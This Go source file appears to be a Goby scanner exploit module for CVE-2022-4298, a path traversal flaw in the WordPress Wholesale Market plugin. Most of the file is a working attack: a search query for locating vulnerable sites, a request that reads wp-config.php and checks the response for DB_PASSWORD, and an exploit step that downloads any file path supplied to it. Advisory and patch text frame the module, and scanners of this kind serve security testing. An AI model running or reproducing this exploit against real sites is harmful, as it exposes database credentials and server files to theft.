package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "WordPress plugin Wholesale Market ced_cwsm_csv_import_export_module_download_error_log File Read Vulnerability (CVE-2022-4298)",
    "Description": "<p>The WordPress plugin Wholesale Market is a woocommerce extension plugin that enables your store to create wholesale users and set wholesale prices for products by.</p><p>The WordPress plugin Wholesale Market version prior to 2.2.1 has a path traversal vulnerability, which is caused by not performing authorization checks and not validating user input. Attackers exploit this vulnerability to download arbitrary files from the server.</p>",
    "Product": "wordpress-plugin-wholesale-market",
    "Homepage": "https://wordpress.org/plugins/wholesale-market/",
    "DisclosureDate": "2023-01-31",
    "Author": "corp0ra1",
    "FofaQuery": "body=\"wp-content/plugins/wholesale-market\"",
    "GobyQuery": "body=\"wp-content/plugins/wholesale-market\"",
    "Level": "3",
    "Impact": "<p>The WordPress plugin Wholesale Market version prior to 2.2.1 has a path traversal vulnerability, which is caused by not performing authorization checks and not validating user input. Attackers exploit this vulnerability to download arbitrary files from the server.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wholesale-market/.\">https://wordpress.org/plugins/wholesale-market/.</a></p>",
    "References": [
        "https://wpscan.com/vulnerability/7485ad23-6ea4-4018-88b1-174312a0a478"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../wp-config.php",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download=../../../wp-config.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "DB_PASSWORD",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "wp-config.php",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/wp-admin/admin-ajax.php?action=ced_cwsm_csv_import_export_module_download_error_log&tab=ced_cwsm_plugin&section=ced_cwsm_csv_import_export_module&ced_cwsm_log_download={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2022-4298"
    ],
    "CNNVD": [
        "CNNVD-202301-064"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "WordPress Wholesale Market 插件 ced_cwsm_csv_import_export_module_download_error_log 任意文件读取漏洞（CVE-2022-4298）",
            "Product": "wordpress-plugin-wholesale-market",
            "Description": "<p>WordPress plugin Wholesale Market 是一个woocommerce扩展插件，使您的商店能够创建批发用户，并通过设置产品的批发价格。<br></p><p>WordPress plugin Wholesale Market 2.2.1之前版本存在路径遍历漏洞，该漏洞源于没有进行授权检查，也不会验证用户输入。攻击者利用该漏洞可以从服务器下载任意文件。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://wordpress.org/plugins/wholesale-market/\">https://wordpress.org/plugins/wholesale-market/</a>。<br></p>",
            "Impact": "<p>WordPress plugin Wholesale Market 2.2.1之前版本存在路径遍历漏洞，该漏洞源于没有进行授权检查，也不会验证用户输入。攻击者利用该漏洞可以从服务器下载任意文件。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "WordPress plugin Wholesale Market ced_cwsm_csv_import_export_module_download_error_log File Read Vulnerability (CVE-2022-4298)",
            "Product": "wordpress-plugin-wholesale-market",
            "Description": "<p>The WordPress plugin Wholesale Market is a woocommerce extension plugin that enables your store to create wholesale users and set wholesale prices for products by.<br></p><p>The WordPress plugin Wholesale Market version prior to 2.2.1 has a path traversal vulnerability, which is caused by not performing authorization checks and not validating user input. Attackers exploit this vulnerability to download arbitrary files from the server.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch is: <a href=\"https://wordpress.org/plugins/wholesale-market/.\">https://wordpress.org/plugins/wholesale-market/.</a><br></p>",
            "Impact": "<p>The WordPress plugin Wholesale Market version prior to 2.2.1 has a path traversal vulnerability, which is caused by not performing authorization checks and not validating user input. Attackers exploit this vulnerability to download arbitrary files from the server.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
